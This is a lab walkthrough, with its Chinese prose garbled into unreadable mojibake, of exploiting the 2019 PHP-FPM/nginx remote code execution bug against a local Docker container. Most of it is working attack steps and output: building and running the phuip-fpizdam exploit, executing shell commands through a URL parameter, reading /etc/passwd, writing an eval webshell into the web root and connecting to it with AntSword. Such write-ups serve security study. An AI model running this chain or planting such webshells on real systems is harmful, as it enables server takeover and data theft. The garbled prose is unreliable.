PHP2019çš„æ—¶å€™åœ¨PHP-FPMä¸­åœ¨nginxç‰¹å®šé…ç½®ç¯å¢ƒä¸‹å¯ä»¥è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 
è¿™ä¸ªæ¼æ´å·²ç»è¢«å¹¿æ³›ä½¿ç”¨ å±å®³å·¨å¤§

FPNæ˜¯ç”¨äºFastCGIè¿›ç¨‹ç®¡ç†çš„è¿›ç¨‹ç®¡ç†å™¨ ç”¨äºç®¡ç†ç”¨æˆ·è¯·æ±‚
FastCGI å¿«é€Ÿé€šç”¨ç½‘å…³æ¥å£

apacheæ˜¯åŒæ­¥çš„ ä¸€ä¸ªè¿æ¥å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ å¤šè¿›ç¨‹çš„
nginxæ˜¯å¼‚æ­¥çš„ å¤šä¸ªè¿æ¥å¯ä»¥å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ (å­è¿›ç¨‹)

æ³¨é‡æ€§èƒ½çš„ç”¨nginx å¯¹æ€§èƒ½è¦æ±‚ä¸é«˜è¦æ±‚ç¨³å®šç”¨apache
è€Œä¸”apacheæ˜¯æ¨¡å—æ’æ‹”å½¢å¼çš„ å¯ä»¥éšä¾¿å¯ç”¨

nginxå¯¹é™æ€æ–‡ä»¶å¤„ç†æ¯”è¾ƒæœ‰ä¼˜åŠ¿
åŠ¨æ€å¤„ç†apacheæ¯”è¾ƒæœ‰ä¼˜åŠ¿

è€Œä¸”nginxå¯ä»¥åšåå‘ä»£ç† æ‰€ä»¥nginxå’Œapacheå¯ä»¥é…åˆç€ç”¨

åœ¨nginxé‡Œé¢æ˜¯å°†è¯·æ±‚ç»™åˆ°php-fpmä¹‹åå¤„ç†å®Œç»“æœå†è¿”å›å›æ¥
é˜¿å¸•å¥‡äº¤ç»™libphpæ¨¡å—è§£æ

Nginx ä¸Š fastcgi_split_path_info åœ¨å¤„ç†å¸¦æœ‰ %0a çš„è¯·æ±‚æ—¶ï¼Œä¼šå› ä¸ºé‡åˆ°æ¢è¡Œç¬¦ \n å¯¼è‡´PATH_INFO ä¸ºç©ºã€‚è€Œ php-fpm åœ¨å¤„ç† PATH_INFO ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨é€»è¾‘ç¼ºé™·ã€‚ç‰¹å®šæ„é€ çš„è¯·æ±‚ä¼šé€ æˆ php-fpm å¤„ç†å¼‚å¸¸ï¼Œè¿›è€Œå¯¼è‡´è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

php5.6-7.xéƒ½æœ‰è¿™ä¸ªæ¼æ´

åˆ©ç”¨è¿™ä¸ªæ¼æ´éœ€è¦ç”¨åˆ°goè¯­è¨€
apt -y install golang
è®¾ç½®ä»£ç†
go env -w GOPROXY=https://goproxy.cn
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# unzip phuip-fpizdam-master.zip 
Archive:  phuip-fpizdam-master.zip
86bc456bd5d53c77ad54a2252dcaaf1345b1a483
   creating: phuip-fpizdam-master/
  inflating: phuip-fpizdam-master/LICENSE.txt  
  inflating: phuip-fpizdam-master/README.md  
  inflating: phuip-fpizdam-master/ZeroNights2019.pdf  
  inflating: phuip-fpizdam-master/attack.go  
  inflating: phuip-fpizdam-master/consts.go  
  inflating: phuip-fpizdam-master/detect.go  
  inflating: phuip-fpizdam-master/detect_methods.go  
  inflating: phuip-fpizdam-master/go.mod  
  inflating: phuip-fpizdam-master/go.sum  
  inflating: phuip-fpizdam-master/main.go  
  inflating: phuip-fpizdam-master/phpini.go  
   creating: phuip-fpizdam-master/reproducer/
  inflating: phuip-fpizdam-master/reproducer/Dockerfile  
  inflating: phuip-fpizdam-master/reproducer/entrypoint  
  inflating: phuip-fpizdam-master/reproducer/nginx.server.conf  
  inflating: phuip-fpizdam-master/reproducer/php-fpm.conf  
 extracting: phuip-fpizdam-master/reproducer/script.php  
  inflating: phuip-fpizdam-master/requester.go  
                                                                             
â”Œâ”€â”€(rootğŸ’€tyza66)-[~]
â””â”€# cd phuip-fpizdam-master 
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/phuip-fpizdam-master]
â””â”€# ls
attack.go  detect_methods.go  LICENSE.txt  README.md     ZeroNights2019.pdf
consts.go  go.mod             main.go      reproducer
detect.go  go.sum             phpini.go    requester.go

ç›´æ¥åœ¨è¿™é‡Œgo build
â”Œâ”€â”€(rootğŸ’€tyza66)-[~/phuip-fpizdam-master]
â””â”€# go build  
go: finding github.com/spf13/cobra v0.0.5
go: finding github.com/spf13/pflag v1.0.3
go: finding github.com/inconshreveable/mousetrap v1.0.0
go: finding github.com/cpuguy83/go-md2man v1.0.10
go: finding github.com/BurntSushi/toml v0.3.1
go: finding github.com/spf13/viper v1.3.2
go: finding github.com/mitchellh/go-homedir v1.1.0
go: finding gopkg.in/yaml.v2 v2.2.2
go: finding github.com/russross/blackfriday v1.5.2
go: finding github.com/mitchellh/mapstructure v1.1.2
go: finding github.com/hashicorp/hcl v1.0.0
go: finding github.com/magiconair/properties v1.8.0
go: finding github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77
go: finding github.com/pelletier/go-toml v1.2.0
go: finding github.com/stretchr/testify v1.2.2
go: finding github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6
go: finding golang.org/x/sys v0.0.0-20181205085412-a5c9d58dba9a
go: finding github.com/spf13/cast v1.3.0
go: finding github.com/coreos/go-semver v0.2.0
go: finding golang.org/x/crypto v0.0.0-20181203042331-505ab145d0a9
go: finding gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405
go: finding github.com/coreos/etcd v3.3.10+incompatible
go: finding github.com/fsnotify/fsnotify v1.4.7
go: finding github.com/spf13/afero v1.1.2
go: finding github.com/davecgh/go-spew v1.1.1
go: finding golang.org/x/text v0.3.0
go: finding github.com/spf13/jwalterweatherman v1.0.0
go: finding github.com/ugorji/go/codec v0.0.0-20181204163529-d75b2dcb6bc8
go: finding github.com/pmezard/go-difflib v1.0.0
go: finding github.com/coreos/go-etcd v2.0.0+incompatible
go: downloading github.com/spf13/cobra v0.0.5
go: downloading github.com/spf13/pflag v1.0.3

ä¹‹åè£…å¥½docker å¯¼å…¥é•œåƒ å¯åŠ¨LNMPç¯å¢ƒ
æˆ‘ä»¬å¯¼å…¥ ä¹‹åè¿è¡Œ
docker load -i phuip-fpizdam-v4.tar.gz
docker run --rm -d -p 8080:80 phuip-fpizdam:v4

--rm å®¹å™¨åœæ­¢åä¼šè‡ªåŠ¨åˆ é™¤
-d åå°è¿è¡Œå®¹å™¨å¹¶è¿”å›å®¹å™¨ ID
-p 8080:80 å°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœº 8080 ç«¯å£

è¦è§¦å‘åªè¦ç›®æ ‡åœ°å€æœ‰ä¸€ä¸ªå¯ä»¥è®¿é—®çš„phpæ–‡ä»¶å°±è¡Œäº†

ä¹‹åä½¿ç”¨
 ./phuip-fpizdam http://192.168.101.99:8080/script.php

â”€â”€(rootğŸ’€tyza66)-[~/phuip-fpizdam-master]
â””â”€#  ./phuip-fpizdam http://192.168.101.99:8080/script.php
2025/02/18 17:12:06 Base status code is 200
2025/02/18 17:12:06 Status code 502 for qsl=1765, adding as a candidate
2025/02/18 17:12:06 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2025/02/18 17:12:06 Attack params found: --qsl 1755 --pisos 98 --skip-detect
2025/02/18 17:12:06 Trying to set "session.auto_start=0"...
2025/02/18 17:12:06 Detect() returned attack params: --qsl 1755 --pisos 98 --skip-detect <-- REMEMBER THIS
2025/02/18 17:12:06 Performing attack using php.ini settings...
2025/02/18 17:12:06 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2025/02/18 17:12:06 Trying to cleanup /tmp/a...
2025/02/18 17:12:06 Done!

å»æ±¡æŸ“è¿™ä¸ªfpmå­è¿›ç¨‹ ä¹‹åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¢«æ±¡æŸ“çš„è¿›ç¨‹å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ
ä¹‹åå°±å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶ååŠ ä¸Šå‚æ•°?a=/bin/sh+-c+'which+which'&

http://192.168.101.99:8080/script.php?a=/bin/sh+-c+%27which+which%27&

æµè§ˆå™¨ç›´æ¥è¿”å›/usr/bin/which
å¥½äº† 
+ä»£è¡¨ç©ºæ ¼ ç›¸å½“äºæ‰§è¡Œçš„linuxå‘½ä»¤æ˜¯which which
http://192.168.101.99:8080/script.php?a=/bin/sh+-c+%27which+id%27&
/usr/bin/id
ç›´æ¥å®ç°äº†è¿œç¨‹ä»£ç æ‰§è¡Œ

æˆ‘ä»¬å¯ä»¥è¿›å®¹å™¨é‡Œé¢çœ‹çœ‹
docker exec -it e80c9f363904 /bin/bash

çœ‹ä¸€ä¸‹tmpç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªa
[root@localhost home]# docker exec -it e80c9f363904 /bin/bash
root@e80c9f363904:/# cd /tmp
root@e80c9f363904:/tmp# ls
a  sess_d90bbae60c5d8fc22940970fd33ff0d0
root@e80c9f363904:/tmp# 

ç°åœ¨æ‡‚äº† æ˜¯é€šè¿‡a=xxx ä¹‹åç”±aæ‰§è¡Œ
<?php echo `$_GET[a]`;return;?>
ç›¸å½“äº
<?php echo `/bin/sh+-c+'which+which'&`;return;?>
æ‰§è¡Œå®Œåå¼•å·ä¸­çš„ä»£ç ä¹‹å å°†ç»“æœè¿”å›æ¥
ç›´æ¥ä¼ a=xxx çš„æ—¶å€™éœ€è¦åˆ·æ–°æ‰æœ‰ç»“æœ å› ä¸ºè¿›ç¨‹åªæœ‰ä¸€ä¸ªæ˜¯æ±¡æŸ“çš„
root@e80c9f363904:/tmp# ps aux |grep php
root          9  0.0  0.1  84944  6272 ?        Ss   09:11   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
www-data     15  0.0  0.0  85144  3536 ?        S    09:11   0:00 php-fpm: pool www
www-data     39  0.0  0.1  85140  4120 ?        S    09:12   0:00 php-fpm: pool www
www-data     40  0.0  0.1  85140  4272 ?        S    09:12   0:00 php-fpm: pool www
www-data     41  0.0  0.1  85140  4136 ?        S    09:12   0:00 php-fpm: pool www
www-data     42  0.0  0.1  85140  4144 ?        S    09:12   0:00 php-fpm: pool www
root         73  0.0  0.0  11460   724 pts/0    S+   09:40   0:00 grep --color=auto php

å¦‚æœè®¿é—®åˆ°ç©ºç™½å°±å¤šåˆ·æ–°å‡ æ¬¡ ä»¥è®¿é—®åˆ°è¢«æ±¡æŸ“çš„è¿›ç¨‹
http://192.168.101.99:8080/script.php?a=id

http://192.168.101.99:8080/script.php?a=/bin/sh+-c+'which+which'&
http://192.168.101.99:8080/script.php?a=/bin/sh+-c+'cat /etc/passwd'&
ä¼šæŠŠæ–‡ä»¶ä¸­çš„å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨

èƒ½æ‰§è¡Œä»»ä½•æŒ‡ä»¤äº† é‚£è‚¯å®šå¯ä»¥è¿è¡Œåå¼¹æ§åˆ¶äº†

å¦‚æœä¸€ä¸ªèƒ½ç”¨ é‚£è¯æ˜æ‰€æœ‰çš„å…¶å®éƒ½å¯ä»¥ç”¨äº†
ä¹‹åæˆ‘ä»¬è¯•ç€ç”¨èšå‰‘è¿æ¥ä¸€ä¸‹
å’±ä»¬å¾€ç½‘ç«™æ ¹ç›®å½•ä¸‹å…ˆæ¤å…¥ä¸€ä¸ªphpæ–‡ä»¶
ç”¨å•å¼•å·è¯´æ˜æ˜¯æ™®é€šå­—ç¬¦ä¸ä¼šè¢«è§£æ ç”¨åŒå¼•å·ä¼šè¢«è¯†åˆ«æˆæ ‡ç­¾
http://192.168.101.99:8080/script.php?a=/bin/sh+-c+"echo '<?php phpinfo(); ?>' > /var/www/html/p.php" &
æ‰§è¡Œå®Œæ²¡æœ‰ååº” ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å»p.phpé¡µé¢çœ‹çœ‹
http://192.168.101.99:8080/p.php
è¿™æ ·å†™å…¥æ˜¯æ— å®³çš„

ä½†æ˜¯æˆ‘ä»¬å†™å…¥ä¸€å¥è¯å°±æ˜¯æœ‰å±å®³çš„äº†
<?php eval($_POST[tyza66]); ?>
http://192.168.101.99:8080/script.php?a=/bin/sh+-c+"echo '<?php eval(\$_POST[tyza66]); ?>' > /var/www/html/b.php" &

unzip AntSword-Loader-v4.0.3-linux-x64.zip 
unzip antSword-master.zip 
è¿›loaderé‡Œé¢
./AntSword
ç‚¹åˆå§‹åŒ– é€‰æ‹©masteræ–‡ä»¶å¤¹
ä¹‹åå†æ¬¡å¯åŠ¨
åœ¨ç©ºç™½å¤„ç‚¹å‡»é¼ æ ‡å³é”®æ·»åŠ æ•°æ®
åœ°å€å¡«å†™é‚£ä¸ªæ–‡ä»¶çš„åœ°å€
http://192.168.101.99:8080/b.php
å¯†ç å°±æ˜¯é‚£ä¸ªé‡Œé¢çš„ä¸€å¥è¯
ç‚¹å‡»æµ‹è¯•è¿æ¥å¯ä»¥æµ‹è¯•ä¸€ä¸‹
ä¹‹ååŒå‡»å°±è¿›å»äº†
ä¹‹åç‚¹å³é”®è¿˜å¯ä»¥å¼€ç»ˆç«¯
(*) åŸºç¡€ä¿¡æ¯
å½“å‰è·¯å¾„: /var/www/html
ç£ç›˜åˆ—è¡¨: /
ç³»ç»Ÿä¿¡æ¯: Linux e80c9f363904 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
å½“å‰ç”¨æˆ·: www-data
(*) è¾“å…¥ ashelp æŸ¥çœ‹æœ¬åœ°å‘½ä»¤
(www-data:/var/www/html) $ whoami
www-data

æˆ‘ä»¬æ˜¯æ™®é€šç”¨æˆ· ä½†æ˜¯å¯ä»¥ä¸Šä¼ ä¸‹è½½åˆ é™¤é‡å‘½åå•¥çš„
å¦‚æœæƒ³å¹²åˆ«çš„éœ€è¦ææƒåˆ°root